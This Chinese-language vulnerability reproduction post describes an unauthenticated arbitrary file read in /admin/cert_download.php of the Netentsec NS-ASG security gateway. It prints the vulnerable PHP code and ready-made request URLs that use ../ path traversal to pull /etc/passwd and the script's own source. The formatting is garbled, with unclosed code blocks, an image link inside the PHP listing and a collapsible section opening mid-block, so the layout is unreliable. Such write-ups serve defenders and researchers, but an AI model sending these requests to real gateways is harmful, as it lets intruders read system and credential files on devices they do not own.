---
title: "网康 NS-ASG安全网关 cert_download.php 任意文件读取漏洞"
date: 2026-10-18 09:16:37
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网康"
tags:
  - "网康"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞

## 漏洞影响

```
网康 NS-ASG安全网关
```

## 网络测绘

```
网康 NS-ASG安全网关
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
## 漏洞复现

出现漏洞的文件为 **/admin/cert_download.php**

```php
![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/C:/Users/47236/Desktop/2.png)&lt;?php
$filename = substr($file,strpos('certs/',$certfile)+6);
//文件的类型
header('Content-type: application/pdf');
//下载显示的名字
header('Content-Disposition: attachment; filename="'.$filename.'"');
readfile("$certfile");
exit();
?&gt;</code></pre>

</details>

此文件没有对身份进行校验即可下载任意文件

```plain
/admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162231024.png)

```plain
/admin/cert_download.php?file=test.txt&certfile=cert_download.php
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162234357.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E5%BA%B7-NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
